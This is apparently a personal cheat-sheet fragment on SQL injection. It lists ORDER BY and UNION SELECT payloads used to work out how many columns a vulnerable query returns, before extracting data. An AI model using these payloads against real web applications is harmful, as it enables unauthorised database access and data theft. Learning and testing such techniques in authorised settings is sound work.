(This one is good to use to quickly find the quantity of columns. Sometimes, they are many.
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
						
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - worked

After, I can try the commands bellow, to see in with column I will insert the commands to grep informations.
